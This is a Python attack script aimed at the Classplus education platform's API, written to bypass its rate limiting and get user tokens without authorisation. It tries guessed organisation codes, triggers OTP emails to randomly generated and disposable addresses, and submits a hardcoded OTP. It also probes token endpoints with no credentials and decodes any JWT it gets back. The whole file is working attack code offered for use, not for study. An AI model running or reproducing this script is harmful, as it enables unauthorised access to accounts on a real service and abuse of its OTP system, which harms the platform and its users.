import requests
import time
import re
import json
import random
import string

def try_different_approaches():
    """Try different approaches to bypass rate limiting"""
    print("🚀 Trying Different Approaches to Bypass Rate Limiting...")
    
    # Approach 1: Try different org codes
    print("\n1️⃣ APPROACH 1: Different Org Codes")
    test_orgs = ["rpsc", "demo", "test", "sample", "classplus", "education"]
    
    for org_code in test_orgs:
        print(f"\n🔍 Testing org code: {org_code}")
        
        try:
            # Get org ID
            url = f"https://api.classplusapp.com/v2/orgs/{org_code}"
            headers = {
                "accept": "application/json, text/plain, */*",
                "user-agent": "Mozilla/5.0"
            }
            res = requests.get(url, headers=headers)
            
            if res.status_code == 200:
                data = res.json()
                if data["status"] == "success":
                    org_id = data["data"]["orgId"]
                    print(f"✅ Valid org: {org_code} (ID: {org_id})")
                    
                    # Try to send OTP
                    email = f"test{random.randint(1000,9999)}@gmail.com"
                    otp_url = "https://api.classplusapp.com/v2/otp/generate"
                    payload = {
                        "countryExt": "91", "email": email, "orgCode": org_code,
                        "viaEmail": "1", "viaSms": "0", "retry": 0, "orgId": org_id,
                        "otpCount": 0, "identifier": email, "source": "web"
                    }
                    headers = {
                        "accept": "application/json", "content-type": "application/json",
                        "origin": "https://web.classplusapp.com", "referer": "https://web.classplusapp.com/",
                        "region": "IN", "user-agent": "Mozilla/5.0", "api-version": "52", "device-id": "1234567890"
                    }
                    
                    otp_res = requests.post(otp_url, json=payload, headers=headers)
                    print(f"📤 OTP Response: {otp_res.status_code}")
                    
                    if otp_res.status_code == 200:
                        print(f"🎉 SUCCESS! Org code {org_code} works!")
                        session_id = otp_res.json()["data"]["sessionId"]
                        
                        # Try to get user token
                        user_token = try_get_user_token(session_id, "123456", org_id, email)
                        if user_token:
                            return {"success": True, "org_code": org_code, "token": user_token}
                    elif otp_res.status_code == 403:
                        print(f"⚠️ Rate limit for {org_code}")
                    else:
                        print(f"❌ OTP failed for {org_code}")
                else:
                    print(f"❌ Invalid org: {org_code}")
            else:
                print(f"❌ Org not found: {org_code}")
                
        except Exception as e:
            print(f"❌ Error with {org_code}: {e}")
    
    # Approach 2: Try direct user token generation
    print("\n2️⃣ APPROACH 2: Direct User Token Generation")
    
    # Try to get user token without OTP
    direct_token = try_direct_user_token()
    if direct_token:
        return {"success": True, "method": "direct", "token": direct_token}
    
    # Approach 3: Manual options
    print("\n3️⃣ APPROACH 3: Manual Options")
    
    # Generate working emails for manual use
    working_emails = []
    for i in range(5):
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        domain = random.choice(['jioso.com', 'toaik.com', 'gmail.com'])
        email = f"{username}@{domain}"
        working_emails.append(email)
    
    print("\n📧 Manual Options Available:")
    for i, email in enumerate(working_emails):
        print(f"{i+1}. Email: {email}")
        print(f"   Use: rpsc*{email}")
    
    return {
        "success": False,
        "manual_emails": working_emails,
        "message": "Use manual mode with provided emails"
    }

def try_get_user_token(session_id, otp, org_id, email):
    """Try to get user token"""
    url = "https://api.classplusapp.com/v2/users/verify"
    payload = {
        "otp": otp, "countryExt": "91", "sessionId": session_id,
        "orgId": org_id, "fingerprintId": "dummy", "email": email
    }
    headers = {
        "accept": "application/json", "content-type": "application/json",
        "origin": "https://web.classplusapp.com", "referer": "https://web.classplusapp.com/",
        "region": "IN", "user-agent": "Mozilla/5.0", "api-version": "52"
    }
    res = requests.post(url, json=payload, headers=headers)
    
    if res.status_code == 201:
        try:
            data = res.json()
            if "data" in data and "token" in data["data"]:
                return data["data"]["token"]
        except:
            pass
    
    return None

def try_direct_user_token():
    """Try to get user token directly"""
    print("🎯 Trying direct user token generation...")
    
    # Try different endpoints
    endpoints = [
        "https://api.classplusapp.com/v2/users/token",
        "https://api.classplusapp.com/v2/auth/token",
        "https://api.classplusapp.com/v2/session/token"
    ]
    
    for endpoint in endpoints:
        try:
            headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "origin": "https://web.classplusapp.com",
                "referer": "https://web.classplusapp.com/",
                "user-agent": "Mozilla/5.0"
            }
            
            res = requests.post(endpoint, headers=headers)
            print(f"📡 {endpoint}: {res.status_code}")
            
            if res.status_code == 200:
                try:
                    data = res.json()
                    if "token" in data:
                        return data["token"]
                except:
                    pass
        except Exception as e:
            print(f"❌ Error with {endpoint}: {e}")
    
    return None

def decode_user_token(token):
    """Decode user token"""
    try:
        import base64
        parts = token.split('.')
        
        if len(parts) != 3:
            return None
        
        payload = parts[1]
        payload += '=' * (4 - len(payload) % 4)
        payload_decoded = base64.b64decode(payload).decode('utf-8')
        payload_json = json.loads(payload_decoded)
        
        return payload_json
    except:
        return None

if __name__ == "__main__":
    result = try_different_approaches()
    
    if result["success"]:
        print("\n🎉 SUCCESS!")
        print(f"🎫 Token: {result['token']}")
        
        # Decode token
        token_info = decode_user_token(result['token'])
        if token_info:
            print("\n📊 Token Information:")
            print(f"   • User ID: {token_info.get('id', 'N/A')}")
            print(f"   • Org ID: {token_info.get('orgID', 'N/A')}")
            print(f"   • Type: {token_info.get('type', 'N/A')}")
            print(f"   • Login Via: {token_info.get('loginVia', 'N/A')}")
            print(f"   • First Login: {token_info.get('isFirstLogin', 'N/A')}")
            
            print("\n📋 Full Token JSON:")
            print(json.dumps(token_info, indent=2))
    else:
        print(f"\n📧 Manual emails: {len(result['manual_emails'])}")
        print("Use manual mode with provided emails")